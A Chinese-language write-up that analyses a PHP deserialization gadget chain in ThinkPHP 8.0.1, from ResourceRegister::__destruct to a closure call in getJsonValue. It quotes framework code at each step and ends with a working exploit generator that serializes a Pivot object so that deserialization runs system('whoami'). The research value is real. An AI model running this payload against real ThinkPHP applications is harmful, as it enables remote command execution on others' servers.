# ThinkPHPv8.0.1

## 0x01

链子流程

```php
ResourceRegister.php::__destruct() -> register() -> Resource.php::parseGroup(Rule.php::$rule) -> Conversion.php::__toString() -> toJson() -> toArray() -> Attribute.php::getAttr() -> getValue() -> getJsonValue()
```

链子比较简单,个人认为难点在于如何构造数据来触发

首先先来找链子的入口点,入口点无非就是`__destruct()`​或者`__wakeup()`​这两个魔术方法,通过全局搜索,我们可以搜索到`ResourceRegister.php`​中的`__destruct()`​方法

```php
public function __destruct()
    {
        if (!$this->registered) {
            $this->register();
        }
    }
```

这里先判断`$registered`​是否存在,如果不存在调用`register()`​方法

```php
protected function register()
    {
        $this->registered = true;
      
        $this->resource->parseGroupRule($this->resource->getRule());
    }
```

这里调用了`Resource.php`​中的`parseGroupRule()`​方法,并把`Rule.php`​中的`getRule()`​方法的返回值作为参数,而`getRule()`​的返回值直接就是`$this->rule;`​

```php
// Rule.php
public function getRule()
    {
        return $this->rule;
    }
// Resource.php 仅只保留关键部分代码
public function parseGroupRule($rule): void
    {
		......
		if (str_contains($rule, '.')) {
            // 注册嵌套资源路由
            $array = explode('.', $rule);
            $last  = array_pop($array);
            $item  = [];

            foreach ($array as $val) {
                $item[] = $val . '/<' . ($option['var'][$val] ?? $val . '_id') . '>';
            }
		......
	}
```

这里看到先对我们传入的`$rule`​判断是否存在`.`​字符,如果存在,则把他们拆分为数组然后遍历数组中的值

这里主要是对数组中的值进行了拼接字符串`/<`​的操作,所以这里可以触发`__toString()`​魔术方法

全局搜索一下魔术方法`__toString()`​,可以找到`Conversion.php`​中的`__toString()`​方法,继续跟进

```php
public function __toString()
    {
        return $this->toJson();
    }
public function toJson(int $options = JSON_UNESCAPED_UNICODE): string
    {
        return json_encode($this->toArray(), $options);
    }
```

这里可以看到通过`__toString()`​走到`toJson()`​然后走到了`toArray()`​方法

```php
public function toArray(): array
    {
        $item = $visible = $hidden = [];
        $hasVisible = false;
        foreach ($this->visible as $key => $val) {
            if (is_string($val)) {
                if (str_contains($val, '.')) {
                    [$relation, $name] = explode('.', $val);
                    $visible[$relation][] = $name;
                } else {
                    $visible[$val] = true;
                    $hasVisible = true;
                }
            } else {
                $visible[$key] = $val;
            }
        }
        foreach ($this->hidden as $key => $val) {
            if (is_string($val)) {
                if (str_contains($val, '.')) {
                    [$relation, $name] = explode('.', $val);
                    $hidden[$relation][] = $name;
                } else {
                    $hidden[$val] = true;
                }
            } else {
                $hidden[$key] = $val;
            }
        }
        // 追加属性（必须定义获取器）
        foreach ($this->append as $key => $name) {
            $this->appendAttrToArray($item, $key, $name, $visible, $hidden);
        }
        // 合并关联数据
        $data = array_merge($this->data, $this->relation);
        foreach ($data as $key => $val) {
            if ($val instanceof Model || $val instanceof ModelCollection) {
                // 关联模型对象
                if (isset($visible[$key]) && is_array($visible[$key])) {
                    $val->visible($visible[$key]);
                } elseif (isset($hidden[$key]) && is_array($hidden[$key])) {
                    $val->hidden($hidden[$key], true);
                }
                // 关联模型对象
                if (!array_key_exists($key, $this->relation) || (array_key_exists($key, $this->with) && (!isset($hidden[$key]) || true !== $hidden[$key]))) {
                    $item[$key] = $val->toArray();
                }
            } elseif (isset($visible[$key])) {
                $item[$key] = $this->getAttr($key);
            } elseif (!isset($hidden[$key]) && !$hasVisible) {
                $item[$key] = $this->getAttr($key);
            }

            if (isset($this->mapping[$key])) {
                // 检查字段映射
                $mapName        = $this->mapping[$key];
                $item[$mapName] = $item[$key];
                unset($item[$key]);
            }
        }
        if ($this->convertNameToCamel) {
            foreach ($item as $key => $val) {
                $name = Str::camel($key);
                if ($name !== $key) {
                    $item[$name] = $val;
                    unset($item[$key]);
                }
            }
        }
        return $item;
    }
```

先跳过前面一大段代码,直接往后走,跟进进入到`getAttr()`​这个方法里面

```php
public function getAttr(string $name)
    {
        try {
            $relation   = false;
            $value      = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $relation   = $this->isRelationAttr($name);
            $value      = null;
        }

        return $this->getValue($name, $value, $relation);
    }
```

这里返回了`getValue()`​这个方法的调用结果,我们继续跟进`getValue()`​

```php
protected function getValue(string $name, $value, bool|string $relation = false)
    {
        // 检测属性获取器
        $fieldName = $this->getRealFieldName($name);

        if (array_key_exists($fieldName, $this->get)) {
            return $this->get[$fieldName];
        }

        $method = 'get' . Str::studly($name) . 'Attr';
        if (isset($this->withAttr[$fieldName])) {
            if ($relation) {
                $value = $this->getRelationValue($relation);
            }

            if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) {
                $value = $this->getJsonValue($fieldName, $value);
            }
		.......
	}
```

这里我们跟进`getJsonValue()`​这个方法,也就是最终`sink`​点

```php
protected function getJsonValue(string $name, $value)
    {
        if (is_null($value)) {
            return $value;
        }

        foreach ($this->withAttr[$name] as $key => $closure) {
            if ($this->jsonAssoc) {
                $value[$key] = $closure($value[$key], $value);
            } else {
                $value->$key = $closure($value->$key, $value);
            }
        }

        return $value;
    }
```

## 0x02

链子的流程我们摸得差不多了,接下来就来构造`exp`​

我们通过反推来构造我们的`exp`​

因为我们最后的`sink`​点是`getJsonValue()`​,所以我们构造命令的重点就在于,怎么控制`$closure($value[$key], $value);`​这三个变量

首先进入这行代码`$this->jsonAssoc`​需要为真,然后可以看到`$closure`​这个变量是由`$this->withAttr[$name]`​的`value`​来赋值的

然后往上走,发现`getJsonValue()`​接受两个参数,一个是`$name`​一个是`$value`​,所以走到上一个方法

可以看到传入`getJsonValue()`​的两个值分别是`$fieldName`​和`$value`​ 但是调用`getJsonValue()`​的前提是`$fieldName`​在`$json`​数组中,且`withAttr[$fieldName]`​是一个数组

所以往上我们就只需要关注这两个值是怎么来的,会有什么函数影响到这两个值

我们可以看到`$value = $this->getRelationValue($relation);`​但是有一个前提条件是`$relation`​需要为真才能进入这个条件,所以我们先搁置

`$fieldName = $this->getRealFieldName($name);`​ 可以看到`$fieldName`​是把`$name`​传到`getRealFieldName()`​方法中得到的结果,所以我们这里还需要跟进一下`getRealFieldName()`​看看这个方法具体会做什么操作

```php
protected function getRealFieldName(string $name): string
    {
        if ($this->convertNameToCamel || !$this->strict) {
            return Str::snake($name);
        }

        return $name;
    }
```

可以看到,如果`$converNameToCamel`​不存在并且`$strict`​存在的情况下,就直接返回`$name`​,所以我们这里理想是满足这两个条件,直接返回`$name`​而不是继续跟进`Str::snake()`​方法

那我们就可以往上走到`getAttr()`​方法中

```php
public function getAttr(string $name)
    {
        try {
            $relation   = false;
            $value      = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $relation   = $this->isRelationAttr($name);
            $value      = null;
        }

        return $this->getValue($name, $value, $relation);
    }
```

可以看到这边`$relation`​的值直接就是`false`​所以前边的`getRelationValue()`​方法我们可以直接跳过了

这里`$value`​的值是`getData($name)`​,所以我们还需要跟进查看

```php
public function getData(string $name = null)
    {
        if (is_null($name)) {
            return $this->data;
        }

        $fieldName = $this->getRealFieldName($name);

        if (array_key_exists($fieldName, $this->data)) {
            return $this->data[$fieldName];
        }

        if (array_key_exists($fieldName, $this->relation)) {
            return $this->relation[$fieldName];
        }

        throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
    }
```

这里可以看到,如果`$fieldName`​是`$data`​的`key`​的话就返回对应的值,如果是`$relation`​同理

然后继续往上个函数走,调用`getAttr()`​方法的前提就是`isset($visible[$key])`​或者`!isset($hidden[$key]) && !$hasVisible`​

因为`$hidden`​一开始就被赋为空,所以我们直接看`$hasVisible`​就可以了,可以看到`$hashVisible`​一开始被赋予`false`​,所以我们只需要让他不要走进下面的`else`​分支就行,也就是`$visible`​的值必须包含`.`​

根据如上,我们就可以构造`exp`​了

但是我们在构造`exp`​的时候不可直接使用`Conversion`​这个类,因为这是一个抽象类,所以我们可以定位一下他的子类,可以找到一个抽象子类`Model`​再查找一下就能找到`Pivot`​这个类,所以我们就要用到这个类来构造我们`exp`​

```php
<?php
namespace think\route{
    class Resource {
    public function __construct()
    {
        $this->rule = "1.1";
        $this->option = ["var" => ["1" => new \think\model\Pivot()]];
    }
}
    class ResourceRegister
{
        protected $resource;
        public function __construct()
        {
            $this->resource = new Resource();
        }
        public function __destruct()
        {
            $this->register();
        }
        protected function register()
        {
            $this->resource->parseGroupRule($this->resource->getRule());
        }
    }
}
	namespace think{
        abstract class Model{
            use model\concern\Attribute;
            private $exists;
            private $force;
            private $lazySave;
            protected $suffix;
  
  
            function __construct($obj = '')
            {
                $this->lazySave = true;
                $this->withEvent = false;
                $this->exists = true;
                $this->force = true;
                $this->table = $obj;
                $this->jsonAssoc = true;
            }
        }
    }
    namespace think\model\concern{
        use think\route\ResourceRegister;
            trait Attribute{
                private $data=['exp'=>['exp'=>'whoami']];
                private $withAttr=['exp'=>['exp'=>'system']];
                protected $json=["exp"];
                protected $jsonAssoc = true;
            }
    
        }
	namespace think\model{
        use think\Model;
        class Pivot extends Model{}
    }
namespace exp{
    use think\route\ResourceRegister;
    $exp = new ResourceRegister();
    echo base64_encode(serialize($exp));
}

```

## 0x03

好像还有一条走`__call()`​的链子,下次再复现一下

参考链接: https://xz.aliyun.com/t/14933

‍

‍

‍
